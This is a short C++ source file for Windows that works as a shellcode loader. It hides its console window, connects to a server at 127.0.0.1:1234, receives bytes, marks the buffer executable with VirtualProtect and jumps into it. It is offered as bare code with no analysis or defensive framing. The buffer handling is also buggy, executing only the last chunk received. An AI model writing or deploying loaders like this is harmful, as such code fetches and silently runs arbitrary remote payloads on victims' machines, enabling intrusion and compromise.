#include <iostream>
#include <vector>
#include <winsock2.h>

int main() {
  using vec = std::vector<CHAR>;

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	sockaddr_in target {};
	WSADATA     wsaData{};
	SOCKET      sock   {};
	int         result {};
	vec         buffer (512),
		          full   {};

	// Startup WSADATA
	WSAStartup(MAKEWORD(2,2),&wsaData);

	sock = socket(AF_INET, SOCK_STREAM, 6);
	if (sock == INVALID_SOCKET) {
		std::cout << "Socket creation failed. " << GetLastError() << '\n';
		return 1;
	}

	target.sin_addr.s_addr  = inet_addr("127.0.0.1");
	target.sin_port			= htons(1234);
	target.sin_family		= AF_INET;

	// Connect to server
	if (connect(sock,(sockaddr*)&target,sizeof(target))) {
			std::cout << "Connection with the server failed. " << GetLastError() << '\n';
			return 1;
	}
	std::cout << "Connected to server.\n";

	// recv from server
	do {
	result = recv(sock,buffer.data(),buffer.size(),0);
		full.insert(full.end(),buffer.begin(),buffer.end());
	}	while (result > 0);

	std::cout << "Done :)\n";
	std::printf("Bytes received: %d",full.size());
	std::cout << "data recieved: " << std::hex << full.data() << '\n';

	void* ptr = buffer.data();

	DWORD dwOld{};
	VirtualProtect(ptr,buffer.size(),PAGE_EXECUTE_READWRITE,&dwOld);

	((void(*)())ptr)();

	std::cout << "heer" << GetLastError() << '\n';
	closesocket(sock);
	WSACleanup();

	return 0;
}
